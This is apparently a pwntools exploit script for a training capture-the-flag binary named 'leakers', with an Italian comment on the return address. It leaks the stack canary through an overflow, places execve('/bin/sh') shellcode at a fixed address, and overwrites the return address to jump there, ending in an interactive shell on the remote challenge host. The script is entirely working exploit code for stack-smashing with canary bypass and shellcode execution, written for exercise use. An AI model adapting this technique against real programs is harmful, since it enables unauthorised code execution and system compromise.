from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./leakers")
    gdb.attach(r, """
            #b *0x00401316
            #b *0x00401348
            b *0x004012f3
            #b *0x00401348
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2010)

asm_code = """
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x4040a0
add rdi, 0x1a
syscall
"""

context.arch = 'amd64'
stringa = "/bin/sh"
shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")

r.sendline(res)
# r.sendline(b"thisisbsss")
#print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)

# print("[!] leaked_canary %s" % leaked_canary)
# print("[!] leaked_canary %#x" % canary)

#shellcode = b"\x48\x89\xF7\x48\x83\xC7\x16\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05/bin/sh\x00"
payload = b"\x90"*104 + leaked_canary + b"B"*8 + b"\xa0\x40\x40\x00\x00\x00\x00\x00"  #l'ultimo è l'indirizzo di ps1 (lo metto anche in rdi nello shellcode) però lo metto di 8 byte aggiungendo degli zeri
r.send(payload)
time.sleep(0.1)
r.sendline("")

r.interactive()
